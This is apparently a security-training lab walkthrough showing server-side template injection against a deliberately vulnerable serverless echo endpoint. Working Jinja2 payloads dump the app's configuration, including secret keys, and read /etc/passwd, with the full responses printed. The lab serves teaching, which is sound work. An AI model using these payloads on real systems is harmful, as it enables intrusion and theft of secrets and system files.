## Server-Side Template Injection

##### Step 1:

* Open Terminal

![](img/Open-Terminal.png)

##### Step 2:

* Run `http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term=hello`

    ```commandline
    root@we45-VirtualBox:/home/we45/container_training/Serverless/Function-Data-Injection/Server-Side-Template-Injection# http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term=hello
    HTTP/1.1 200 OK
    Connection: keep-alive
    Content-Length: 240
    Content-Type: text/html; charset=utf-8
    Date: Mon, 01 Oct 2018 09:08:31 GMT
    Via: 1.1 940482e8695da5fdb5cf0f4bf9f97421.cloudfront.net (CloudFront)
    X-Amz-Cf-Id: _zJjQFb9cXp9UwQ6V18DC6ZVZ4tkOkXpqsVNwaS_ciso5Y1nTf6TQw==
    X-Amzn-Trace-Id: Root=1-5bb1e40f-e1cb640e24f1f0448c6b2996;Sampled=1
    X-Cache: Miss from cloudfront
    x-amz-apigw-id: OFCScHllIAMFRVg=
    x-amzn-Remapped-Content-Length: 240
    x-amzn-RequestId: 915925f4-c559-11e8-98e2-2b927f67138f
    
    <html>
                <head>
                <title>Confirmation Page</title>
                </head>
                <body>
                <h1>Is this what you searched for?/h1>
                <h3>hello</h3>
                </body>
                </html>
    ```

##### Step 3:

* Run the below command to get the system configuration.

```commandline
http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{config.items()}}"
```

    ```commandline
    root@we45-VirtualBox:/home/we45/container_training/Serverless/Function-Data-Injection/Server-Side-Template-Injection# http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{config.items()}}"
    HTTP/1.1 200 OK
    Connection: keep-alive
    Content-Length: 1750
    Content-Type: text/html; charset=utf-8
    Date: Mon, 01 Oct 2018 09:12:20 GMT
    Via: 1.1 577d9c1fdd6c86b035e540060f4b14d1.cloudfront.net (CloudFront)
    X-Amz-Cf-Id: -vTeauaWRtOLFKqYjOfx5yuttBSb12yhiDyun0QjuLaGUacggRvPow==
    X-Amzn-Trace-Id: Root=1-5bb1e4f4-d3761b840ebaf386e0707c26;Sampled=1
    X-Cache: Miss from cloudfront
    x-amz-apigw-id: OFC2JEzIIAMFzxA=
    x-amzn-Remapped-Content-Length: 1750
    x-amzn-RequestId: 19936aec-c55a-11e8-8bf9-bdca732a36c8
    
    <html>
                <head>
                <title>Confirmation Page</title>
                </head>
                <body>
                <h1>Is this what you searched for?/h1>
                <h3>[(&#39;JSON_AS_ASCII&#39;, True), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SQLALCHEMY_DATABASE_URI&#39;, &#39;sqlite:///test.db&#39;), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;MAX_COOKIE_SIZE&#39;, 4093), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;SECRET_KEY_HMAC&#39;, &#39;secret&#39;), (&#39;SECRET_KEY&#39;, &#39;F12Zr47j\x03yX R~X@H!jmM]Lwf/,?KT&#39;), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;UPLOAD_FOLDER&#39;, &#39;/tmp&#39;), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SERVER_NAME&#39;, None), (&#39;STATIC_FOLDER&#39;, None), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;TESTING&#39;, False), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;SECRET_KEY_HMAC_2&#39;, &#39;am0r3C0mpl3xK3y&#39;), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(0, 43200)), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False)]</h3>
                </body>
                </html>
    
    ```
    
##### Step 4:

* Run the below  command to get the etc/password file info.

```commandline
http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}"
```


    ```commandline
    root@we45-VirtualBox:/home/we45/container_training/Serverless/Function-Data-Injection/Server-Side-Template-Injection# http POST https://ynjz17crme.execute-api.us-east-1.amazonaws.com/dev/echo_service search_term="{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}"
    HTTP/1.1 200 OK
    Connection: keep-alive
    Content-Length: 8679
    Content-Type: text/html; charset=utf-8
    Date: Mon, 01 Oct 2018 09:14:26 GMT
    Via: 1.1 c140abacd6e3d9e1ae433470387a992d.cloudfront.net (CloudFront)
    X-Amz-Cf-Id: jQR57p3x6pHbQguqStETNt2kjasUm-0rj1dnJoFY7tfUvXE3zsFEMQ==
    X-Amzn-Trace-Id: Root=1-5bb1e572-707a890a072a26811a6f0852;Sampled=1
    X-Cache: Miss from cloudfront
    x-amz-apigw-id: OFDJ0HHzIAMFWqg=
    x-amzn-Remapped-Content-Length: 8679
    x-amzn-RequestId: 649e3b5e-c55a-11e8-bbcf-f781181e2e7f
    
    <html>
                <head>
                <title>Confirmation Page</title>
                </head>
                <body>
                <h1>Is this what you searched for?/h1>
                <h3>root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    games:x:12:100:games:/usr/games:/sbin/nologin
    gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
    nobody:x:99:99:Nobody:/:/sbin/nologin
    rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin
    ntp:x:38:38::/etc/ntp:/sbin/nologin
    saslauth:x:499:76:&#34;Saslauthd user&#34;:/var/empty/saslauth:/sbin/nologin
    mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
    smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
    rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
    nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
    dbus:x:81:81:System message bus:/:/sbin/nologin
    ec2-user:x:500:500:EC2 Default User:/home/ec2-user:/bin/bash
    slicer:x:498:497::/tmp:/sbin/nologin
    sb_logger:x:497:496::/tmp:/sbin/nologin
    sbx_user1051:x:496:495::/home/sbx_user1051:/sbin/nologin
    sbx_user1052:x:495:494::/home/sbx_user1052:/sbin/nologin
    sbx_user1053:x:494:493::/home/sbx_user1053:/sbin/nologin
    sbx_user1054:x:493:492::/home/sbx_user1054:/sbin/nologin
    sbx_user1055:x:492:491::/home/sbx_user1055:/sbin/nologin
    sbx_user1056:x:491:490::/home/sbx_user1056:/sbin/nologin
    sbx_user1057:x:490:489::/home/sbx_user1057:/sbin/nologin
    sbx_user1058:x:489:488::/home/sbx_user1058:/sbin/nologin
    sbx_user1059:x:488:487::/home/sbx_user1059:/sbin/nologin
    sbx_user1060:x:487:486::/home/sbx_user1060:/sbin/nologin
    sbx_user1061:x:486:485::/home/sbx_user1061:/sbin/nologin
    sbx_user1062:x:485:484::/home/sbx_user1062:/sbin/nologin
    sbx_user1063:x:484:483::/home/sbx_user1063:/sbin/nologin
    sbx_user1064:x:483:482::/home/sbx_user1064:/sbin/nologin
    sbx_user1065:x:482:481::/home/sbx_user1065:/sbin/nologin
    sbx_user1066:x:481:480::/home/sbx_user1066:/sbin/nologin
    sbx_user1067:x:480:479::/home/sbx_user1067:/sbin/nologin
    sbx_user1068:x:479:478::/home/sbx_user1068:/sbin/nologin
    sbx_user1069:x:478:477::/home/sbx_user1069:/sbin/nologin
    sbx_user1070:x:477:476::/home/sbx_user1070:/sbin/nologin
    sbx_user1071:x:476:475::/home/sbx_user1071:/sbin/nologin
    sbx_user1072:x:475:474::/home/sbx_user1072:/sbin/nologin
    sbx_user1073:x:474:473::/home/sbx_user1073:/sbin/nologin
    sbx_user1074:x:473:472::/home/sbx_user1074:/sbin/nologin
    sbx_user1075:x:472:471::/home/sbx_user1075:/sbin/nologin
    sbx_user1076:x:471:470::/home/sbx_user1076:/sbin/nologin
    sbx_user1077:x:470:469::/home/sbx_user1077:/sbin/nologin
    sbx_user1078:x:469:468::/home/sbx_user1078:/sbin/nologin
    sbx_user1079:x:468:467::/home/sbx_user1079:/sbin/nologin
    sbx_user1080:x:467:466::/home/sbx_user1080:/sbin/nologin
    sbx_user1081:x:466:465::/home/sbx_user1081:/sbin/nologin
    sbx_user1082:x:465:464::/home/sbx_user1082:/sbin/nologin
    sbx_user1083:x:464:463::/home/sbx_user1083:/sbin/nologin
    sbx_user1084:x:463:462::/home/sbx_user1084:/sbin/nologin
    sbx_user1085:x:462:461::/home/sbx_user1085:/sbin/nologin
    sbx_user1086:x:461:460::/home/sbx_user1086:/sbin/nologin
    sbx_user1087:x:460:459::/home/sbx_user1087:/sbin/nologin
    sbx_user1088:x:459:458::/home/sbx_user1088:/sbin/nologin
    sbx_user1089:x:458:457::/home/sbx_user1089:/sbin/nologin
    sbx_user1090:x:457:456::/home/sbx_user1090:/sbin/nologin
    sbx_user1091:x:456:455::/home/sbx_user1091:/sbin/nologin
    sbx_user1092:x:455:454::/home/sbx_user1092:/sbin/nologin
    sbx_user1093:x:454:453::/home/sbx_user1093:/sbin/nologin
    sbx_user1094:x:453:452::/home/sbx_user1094:/sbin/nologin
    sbx_user1095:x:452:451::/home/sbx_user1095:/sbin/nologin
    sbx_user1096:x:451:450::/home/sbx_user1096:/sbin/nologin
    sbx_user1097:x:450:449::/home/sbx_user1097:/sbin/nologin
    sbx_user1098:x:449:448::/home/sbx_user1098:/sbin/nologin
    sbx_user1099:x:448:447::/home/sbx_user1099:/sbin/nologin
    sbx_user1100:x:447:446::/home/sbx_user1100:/sbin/nologin
    sbx_user1101:x:446:445::/home/sbx_user1101:/sbin/nologin
    sbx_user1102:x:445:444::/home/sbx_user1102:/sbin/nologin
    sbx_user1103:x:444:443::/home/sbx_user1103:/sbin/nologin
    sbx_user1104:x:443:442::/home/sbx_user1104:/sbin/nologin
    sbx_user1105:x:442:441::/home/sbx_user1105:/sbin/nologin
    sbx_user1106:x:441:440::/home/sbx_user1106:/sbin/nologin
    sbx_user1107:x:440:439::/home/sbx_user1107:/sbin/nologin
    sbx_user1108:x:439:438::/home/sbx_user1108:/sbin/nologin
    sbx_user1109:x:438:437::/home/sbx_user1109:/sbin/nologin
    sbx_user1110:x:437:436::/home/sbx_user1110:/sbin/nologin
    sbx_user1111:x:436:435::/home/sbx_user1111:/sbin/nologin
    sbx_user1112:x:435:434::/home/sbx_user1112:/sbin/nologin
    sbx_user1113:x:434:433::/home/sbx_user1113:/sbin/nologin
    sbx_user1114:x:433:432::/home/sbx_user1114:/sbin/nologin
    sbx_user1115:x:432:431::/home/sbx_user1115:/sbin/nologin
    sbx_user1116:x:431:430::/home/sbx_user1116:/sbin/nologin
    sbx_user1117:x:430:429::/home/sbx_user1117:/sbin/nologin
    sbx_user1118:x:429:428::/home/sbx_user1118:/sbin/nologin
    sbx_user1119:x:428:427::/home/sbx_user1119:/sbin/nologin
    sbx_user1120:x:427:426::/home/sbx_user1120:/sbin/nologin
    sbx_user1121:x:426:425::/home/sbx_user1121:/sbin/nologin
    sbx_user1122:x:425:424::/home/sbx_user1122:/sbin/nologin
    sbx_user1123:x:424:423::/home/sbx_user1123:/sbin/nologin
    sbx_user1124:x:423:422::/home/sbx_user1124:/sbin/nologin
    sbx_user1125:x:422:421::/home/sbx_user1125:/sbin/nologin
    sbx_user1126:x:421:420::/home/sbx_user1126:/sbin/nologin
    sbx_user1127:x:420:419::/home/sbx_user1127:/sbin/nologin
    sbx_user1128:x:419:418::/home/sbx_user1128:/sbin/nologin
    sbx_user1129:x:418:417::/home/sbx_user1129:/sbin/nologin
    sbx_user1130:x:417:416::/home/sbx_user1130:/sbin/nologin
    sbx_user1131:x:416:415::/home/sbx_user1131:/sbin/nologin
    sbx_user1132:x:415:414::/home/sbx_user1132:/sbin/nologin
    sbx_user1133:x:414:413::/home/sbx_user1133:/sbin/nologin
    sbx_user1134:x:413:412::/home/sbx_user1134:/sbin/nologin
    sbx_user1135:x:412:411::/home/sbx_user1135:/sbin/nologin
    sbx_user1136:x:411:410::/home/sbx_user1136:/sbin/nologin
    sbx_user1137:x:410:409::/home/sbx_user1137:/sbin/nologin
    sbx_user1138:x:409:408::/home/sbx_user1138:/sbin/nologin
    sbx_user1139:x:408:407::/home/sbx_user1139:/sbin/nologin
    sbx_user1140:x:407:406::/home/sbx_user1140:/sbin/nologin
    sbx_user1141:x:406:405::/home/sbx_user1141:/sbin/nologin
    sbx_user1142:x:405:404::/home/sbx_user1142:/sbin/nologin
    sbx_user1143:x:404:403::/home/sbx_user1143:/sbin/nologin
    sbx_user1144:x:403:402::/home/sbx_user1144:/sbin/nologin
    sbx_user1145:x:402:401::/home/sbx_user1145:/sbin/nologin
    sbx_user1146:x:401:400::/home/sbx_user1146:/sbin/nologin
    sbx_user1147:x:400:399::/home/sbx_user1147:/sbin/nologin
    sbx_user1148:x:399:398::/home/sbx_user1148:/sbin/nologin
    sbx_user1149:x:398:397::/home/sbx_user1149:/sbin/nologin
    sbx_user1150:x:397:396::/home/sbx_user1150:/sbin/nologin
    sbx_user1151:x:396:395::/home/sbx_user1151:/sbin/nologin
    sbx_user1152:x:395:394::/home/sbx_user1152:/sbin/nologin
    sbx_user1153:x:394:393::/home/sbx_user1153:/sbin/nologin
    sbx_user1154:x:393:392::/home/sbx_user1154:/sbin/nologin
    sbx_user1155:x:392:391::/home/sbx_user1155:/sbin/nologin
    sbx_user1156:x:391:390::/home/sbx_user1156:/sbin/nologin
    sbx_user1157:x:390:389::/home/sbx_user1157:/sbin/nologin
    sbx_user1158:x:389:388::/home/sbx_user1158:/sbin/nologin
    sbx_user1159:x:388:387::/home/sbx_user1159:/sbin/nologin
    sbx_user1160:x:387:386::/home/sbx_user1160:/sbin/nologin
    sbx_user1161:x:386:385::/home/sbx_user1161:/sbin/nologin
    sbx_user1162:x:385:384::/home/sbx_user1162:/sbin/nologin
    sbx_user1163:x:384:383::/home/sbx_user1163:/sbin/nologin
    sbx_user1164:x:383:382::/home/sbx_user1164:/sbin/nologin
    sbx_user1165:x:382:381::/home/sbx_user1165:/sbin/nologin
    sbx_user1166:x:381:380::/home/sbx_user1166:/sbin/nologin
    sbx_user1167:x:380:379::/home/sbx_user1167:/sbin/nologin
    sbx_user1168:x:379:378::/home/sbx_user1168:/sbin/nologin
    sbx_user1169:x:378:377::/home/sbx_user1169:/sbin/nologin
    sbx_user1170:x:377:376::/home/sbx_user1170:/sbin/nologin
    sbx_user1171:x:376:375::/home/sbx_user1171:/sbin/nologin
    sbx_user1172:x:375:374::/home/sbx_user1172:/sbin/nologin
    sbx_user1173:x:374:373::/home/sbx_user1173:/sbin/nologin
    sbx_user1174:x:373:372::/home/sbx_user1174:/sbin/nologin
    sbx_user1175:x:372:371::/home/sbx_user1175:/sbin/nologin
    sbx_user1176:x:371:370::/home/sbx_user1176:/sbin/nologin
    </h3>
                </body>
                </html>
    ```
